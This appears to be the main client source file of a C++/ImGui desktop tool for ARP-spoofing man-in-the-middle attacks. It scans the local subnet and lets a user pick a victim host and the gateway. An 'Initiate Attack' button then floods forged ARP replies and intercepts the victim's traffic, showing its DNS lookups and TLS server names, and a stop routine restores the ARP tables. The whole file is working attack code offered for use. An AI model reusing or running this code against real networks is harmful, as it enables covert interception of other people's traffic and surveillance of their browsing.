#include "Client.h"
#include "imgui/imgui.h"
#include <WS2spi.h>
#include <thread>
#include <mutex>

#define CHECK_TO_BLINK_ELEMENT (fmodf((float)ImGui::GetTime(), 0.80f) < 0.34f)
#define INTERCEPTED_PACKET_BUFFER_SIZE 200

typedef std::shared_ptr<GenericPacket> GenericPacketRef;
typedef std::pair<PacketHeader, GenericPacketRef> PacketNode;

static std::vector<PacketNode> s_intercepted_packets;
static std::mutex s_packet_interception_mutex;

void ClientApplication::init()
{
	set_dark_theme_colors();
	s_intercepted_packets.clear();

	m_adapter_list.find_adapters();
}

void ClientApplication::render()
{
	// Create dockspace
	ImGui::DockSpaceOverViewport(ImGui::GetMainViewport());

	// If there is no selected adapter, render
	// the adapter list so the user can select
	// their desired adapter.
	if (!m_selected_adapter.is_online)
	{
		render_adapters_list();
		return;
	}

	// At this point, a specific adapter has been selected.
	// First, render the local network info and MITM attack data.
	render_mitm_attack_data();

	// If the user needs to select the target,
	// display the target selection window.
	if (m_display_select_target_window)
	{
		ImGui::OpenPopup(m_select_target_window_id);
		m_display_select_target_window = false;
	}
	render_target_selection_window();

	// If the user needs to select the gateway,
	// display the target selection window.
	if (m_display_select_gateway_window)
	{
		ImGui::OpenPopup(m_select_gateway_window_id);
		m_display_select_gateway_window = false;
	}
	render_gateway_selection_window();

	// Render the intercepted traffic window
	render_intercepted_traffic_window();
}

void ClientApplication::set_dark_theme_colors()
{
	auto& colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_WindowBg] = ImVec4{ 0.1f, 0.105f, 0.11f, 1.0f };

	// Headers
	colors[ImGuiCol_Header] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_HeaderHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_HeaderActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Buttons
	colors[ImGuiCol_Button] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_ButtonHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_ButtonActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Frame BG
	colors[ImGuiCol_FrameBg] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_FrameBgHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_FrameBgActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Tabs
	colors[ImGuiCol_Tab] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TabHovered] = ImVec4{ 0.38f, 0.3805f, 0.381f, 1.0f };
	colors[ImGuiCol_TabActive] = ImVec4{ 0.28f, 0.2805f, 0.281f, 1.0f };
	colors[ImGuiCol_TabUnfocused] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };

	// Title
	colors[ImGuiCol_TitleBg] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TitleBgActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
}

void ClientApplication::render_adapters_list()
{
	auto window_height = 100 + m_adapter_list.adapters.size() * 60;
	ImGui::SetNextWindowSize(ImVec2(500, (float)window_height));
	ImGui::Begin("Select Adapter", nullptr, ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoCollapse);

    auto& io = ImGui::GetIO();

    ImGui::Text("Found Adapters: %zi", m_adapter_list.adapters.size());
    ImGui::Separator();

	for (auto& adapter : m_adapter_list.adapters)
	{
		if (ImGui::TreeNode(adapter.description.c_str()))
		{
			constexpr float indent_w = 16.0f;

			ImGui::Spacing();
			ImGui::Indent(indent_w);

			ImGui::Text("ID: %s", adapter.name.c_str());
			ImGui::Text("Address: %s", adapter.address.to_string().c_str());
			ImGui::Text("Netmask: %s", adapter.netmask.to_string().c_str());
			ImGui::Text("Broadcast: %s", adapter.broadcast.to_string().c_str());

			bool b_selected = ImGui::Button("Select");
			if (b_selected)
			{
				// Set the selected adapter
				m_selected_adapter = adapter;
				net_utils::set_adapter(m_selected_adapter);

				// Retrieve the local MAC address
				net_utils::retrieve_local_mac_address(m_mitm_data.local_mac_address);

				// Set the IPv4 field in MITM data structure
				m_mitm_data.local_ip = adapter.address.to_string();
			}

			ImGui::TreePop();
			ImGui::Spacing();
			ImGui::Separator();
			ImGui::Unindent(indent_w);
		}
		ImGui::Spacing();
	}

	ImGui::End();
}

void ClientApplication::render_mitm_attack_data()
{
	ImGui::SetNextWindowSize(ImVec2(300, 240));
	ImGui::Begin("MITM Data", nullptr, ImGuiWindowFlags_AlwaysAutoResize);

	// Display Local Data
	ImGui::SetNextItemOpen(m_mitm_local_data_opened_flag);
	m_mitm_local_data_opened_flag = ImGui::TreeNode("Local Info");
	if (m_mitm_local_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
			m_mitm_data.local_mac_address[0],
			m_mitm_data.local_mac_address[1],
			m_mitm_data.local_mac_address[2],
			m_mitm_data.local_mac_address[3],
			m_mitm_data.local_mac_address[4],
			m_mitm_data.local_mac_address[5]
		);

		ImGui::Text("IPv4: %s", m_mitm_data.local_ip.c_str());

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	ImGui::Separator();

	// Display Target Data
	ImGui::SetNextItemOpen(m_mitm_target_data_opened_flag);
	m_mitm_target_data_opened_flag = ImGui::TreeNode("Target");
	if (m_mitm_target_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		if (!m_mitm_data.target_ip.empty())
		{
			ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				m_mitm_data.target_mac_address[0],
				m_mitm_data.target_mac_address[1],
				m_mitm_data.target_mac_address[2],
				m_mitm_data.target_mac_address[3],
				m_mitm_data.target_mac_address[4],
				m_mitm_data.target_mac_address[5]
			);

			ImGui::Text("IPv4: %s", m_mitm_data.target_ip.c_str());
			ImGui::Text((!m_mitm_data.attack_in_progress) ? "ARP Table: Real" : "ARP Table: Spoofed");
		}
		else
		{
			ImGui::Text("Target not selected");
			ImGui::SameLine();
		}

		if (!m_mitm_data.attack_in_progress)
		{
			bool select_clicked = ImGui::Button("Select");
			if (select_clicked)
			{
				m_display_select_target_window = true;
				m_is_host_selection_window_opened = true;
			}
		}

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	ImGui::Separator();

	// Display Gateway Data
	ImGui::SetNextItemOpen(m_mitm_gateway_data_opened_flag);
	m_mitm_gateway_data_opened_flag = ImGui::TreeNode("Gateway");
	if (m_mitm_gateway_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		if (!m_mitm_data.gateway_ip.empty())
		{
			ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				m_mitm_data.gateway_mac_address[0],
				m_mitm_data.gateway_mac_address[1],
				m_mitm_data.gateway_mac_address[2],
				m_mitm_data.gateway_mac_address[3],
				m_mitm_data.gateway_mac_address[4],
				m_mitm_data.gateway_mac_address[5]
			);

			ImGui::Text("IPv4: %s", m_mitm_data.gateway_ip.c_str());
			ImGui::Text((!m_mitm_data.attack_in_progress) ? "ARP Table: Real" : "ARP Table: Spoofed");
		}
		else
		{
			ImGui::Text("Gateway not selected");
			ImGui::SameLine();
		}

		if (!m_mitm_data.attack_in_progress)
		{
			bool select_clicked = ImGui::Button("Select");
			if (select_clicked)
			{
				m_display_select_gateway_window = true;
				m_is_host_selection_window_opened = true;
			}
		}

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	
	if (!m_mitm_data.target_ip.empty() &&
		!m_mitm_data.gateway_ip.empty())
	{
		ImGui::Separator();
		for (size_t i = 0; i < 5; ++i) { ImGui::Spacing(); }

		ImGui::SetCursorPosX(ImGui::GetWindowSize().x / 2.0f - 55.0f);
		
		if (!m_mitm_data.attack_in_progress)
		{
			if (ImGui::Button("Initiate Attack", ImVec2(110, 25)))
			{
				m_mitm_data.attack_in_progress = true;
				start_arp_spoofing_loop();
				start_traffic_interception_loop();
			}
		}
		else
		{

			if (!m_mitm_data.rearping_in_progress)
			{
				if (ImGui::Button("Stop Attack", ImVec2(110, 25)))
				{
					s_intercepted_packets.clear();
					stop_attack_and_restore_arp_tables();
				}
			}
			else if (CHECK_TO_BLINK_ELEMENT)
			{
				ImGui::Text("Re-Arping Targets...");
			}
		}
	}

	ImGui::End();
}

void ClientApplication::render_target_selection_window()
{
	render_generic_host_selection_window(m_select_target_window_id, m_mitm_data.target_ip, m_mitm_data.target_mac_address);
}

void ClientApplication::render_gateway_selection_window()
{
	render_generic_host_selection_window(m_select_gateway_window_id, m_mitm_data.gateway_ip, m_mitm_data.gateway_mac_address);
}

void ClientApplication::render_generic_host_selection_window(const char* popup_target_id, std::string& ip_buffer, macaddr mac_buffer)
{
	ImGui::SetNextWindowSize(ImVec2(300, 500));
	if (ImGui::BeginPopupModal(popup_target_id, &m_is_host_selection_window_opened, ImGuiWindowFlags_AlwaysAutoResize))
	{
		ImGui::Text("Hosts Found: %zi", network_scanner::s_network_scan_map.size());
		ImGui::SameLine();
		ImGui::SetCursorPosX(ImGui::GetWindowWidth() - 120);

		if (!m_scanning_network)
		{
			if (ImGui::Button("Scan network"))
			{
				m_scanning_network = true;

				std::thread scanning_thread([this]() {
					auto local_ip = m_mitm_data.local_ip;
					auto ip_prefix = local_ip.substr(0, local_ip.rfind(".") + 1);
					network_scanner::scan_network(m_mitm_data.local_mac_address, local_ip, ip_prefix);

					m_scanning_network = false;
					});
				scanning_thread.detach();
			}
		}
		else
		{
			ImGui::Text("Scanning...");
		}

		ImGui::Spacing();
		ImGui::Separator();
		ImGui::Spacing();

		// Create a copy of the scan map to avoid
		// iteration issues during multithreaded scanning.
		std::map<std::string, network_scanner::netscan_node> scan_map_copy = network_scanner::s_network_scan_map;

		for (auto& [ip, node] : scan_map_copy)
		{
			if (ImGui::Selectable(("##host" + ip).c_str()))
			{
				ip_buffer = ip.c_str();
				memcpy(mac_buffer, node.physical_address, sizeof(macaddr));
			}

			ImGui::SameLine();
			ImGui::SetCursorPosX(8);

			ImGui::Text("%s", ip.c_str());
			ImGui::SameLine();

			auto indent = ImGui::GetWindowWidth() - 132;
			ImGui::SetCursorPosX(indent);

			ImGui::Text("%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				node.physical_address[0],
				node.physical_address[1],
				node.physical_address[2],
				node.physical_address[3],
				node.physical_address[4],
				node.physical_address[5]
			);

			ImGui::Spacing();
		}

		ImGui::EndPopup();
	}
}

void ClientApplication::render_intercepted_traffic_window()
{
	ImGui::SetNextWindowSize(ImVec2(500, 400));
	ImGui::Begin("Intercepted Traffic");

	if (!m_mitm_data.attack_in_progress || m_mitm_data.rearping_in_progress)
	{
		auto middle_x = ImGui::GetWindowSize().x / 2.0f - 60.0f;
		auto middle_y = ImGui::GetWindowSize().y / 2.0f - 8.0f;
		ImGui::SetCursorPos(ImVec2(middle_x, middle_y));
		ImGui::Text("No Attack Detected");
	}
	else
	{
		for (auto& [header, packet_ref] : s_intercepted_packets)
		{
			// Skip over faulty packets
			if (!packet_ref)
				continue;

			EthHeader* eth_header = get_eth_header(packet_ref->buffer);

			// Check if the packet was originated from the target host
			bool target_is_sender = memcmp(eth_header->src, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			if (!target_is_sender)
				continue;

			// TLS Filter
			if (has_client_tls_layer(packet_ref->buffer))
			{
				TlsHandshake* tls_handshake = get_tls_handshake(get_tls_header(packet_ref->buffer));

				ImGui::Text("TLS Connection: ");
				ImGui::SameLine();
				ImGui::Text(extract_tls_connection_server_name(tls_handshake).c_str());
			}

			// DNS Filter
			if (has_client_dns_layer(packet_ref->buffer))
			{
				DnsHeader* dns_header = get_dns_header(packet_ref->buffer);
				if (ntohs(dns_header->qdcount) == 1)
				{
					ImGui::Text("DNS Query: ");
					ImGui::SameLine();
					ImGui::Text(extract_dns_query_qname(dns_header).c_str());
				}
			}
		}
	}

	ImGui::End();
}

void ClientApplication::start_arp_spoofing_loop()
{
	std::thread spoofing_thread([this]() {
		ArpPacket target_packet;
		craft_arp_reply_packet(
			&target_packet,
			m_mitm_data.local_mac_address,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_ip.c_str(),
			m_mitm_data.target_ip.c_str()
		);

		ArpPacket gateway_packet;
		craft_arp_reply_packet(
			&gateway_packet,
			m_mitm_data.local_mac_address,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_ip.c_str(),
			m_mitm_data.gateway_ip.c_str()
		);

		while (m_mitm_data.attack_in_progress &&
			   !m_mitm_data.rearping_in_progress)
		{
			net_utils::send_packet(&target_packet, sizeof(ArpPacket));
			net_utils::send_packet(&gateway_packet, sizeof(ArpPacket));
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	});
	spoofing_thread.detach();
}

void ClientApplication::stop_attack_and_restore_arp_tables()
{
	std::thread rearp_thread([this]() {
		m_mitm_data.rearping_in_progress = true;
		std::this_thread::sleep_for(std::chrono::seconds(1));

		ArpPacket target_restore_packet;
		craft_arp_reply_packet(
			&target_restore_packet,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_ip.c_str(),
			m_mitm_data.target_ip.c_str()
		);

		ArpPacket gateway_restore_packet;
		craft_arp_reply_packet(
			&gateway_restore_packet,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_ip.c_str(),
			m_mitm_data.gateway_ip.c_str()
		);

		for (size_t i = 0; i < 20; i++)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
			net_utils::send_packet(&target_restore_packet, sizeof(ArpPacket));
		}
		for (size_t i = 0; i < 20; i++)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
			net_utils::send_packet(&gateway_restore_packet, sizeof(ArpPacket));
		}

		m_mitm_data.attack_in_progress = false;
		m_mitm_data.rearping_in_progress = false;
	});
	rearp_thread.detach();
}

void ClientApplication::start_traffic_interception_loop()
{
	std::thread interception_thread([this]() {
		while (m_mitm_data.attack_in_progress &&
			!m_mitm_data.rearping_in_progress)
		{
			auto packet = std::make_shared<GenericPacket>();
			PacketHeader header;

			net_utils::recv_packet(&header, packet->buffer, MAX_PACKET_SIZE);

			EthHeader* eth_header = get_eth_header(packet->buffer);

			// Check if the packet was originated from the target host
			bool target_is_sender = memcmp(eth_header->src, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			// Check if the packet was originated from the gateway host
			bool gateway_is_sender = memcmp(eth_header->src, m_mitm_data.gateway_mac_address, sizeof(macaddr)) == 0;

			// If packet is not from the gateway to the target
			// or from target to gateway, skip the packet.
			if (!target_is_sender && !gateway_is_sender)
				continue;

			// Lock the mutex
			s_packet_interception_mutex.lock();

			// Check if packet node buffer needs to be partially freed up
			if (s_intercepted_packets.size() > INTERCEPTED_PACKET_BUFFER_SIZE)
				s_intercepted_packets.resize(s_intercepted_packets.size() - (INTERCEPTED_PACKET_BUFFER_SIZE / 4));

			// Insert the packet node
			s_intercepted_packets.insert(s_intercepted_packets.begin(), { header, packet });

			// Unlock the mutex
			s_packet_interception_mutex.unlock();
		}
	});
	interception_thread.detach();
}
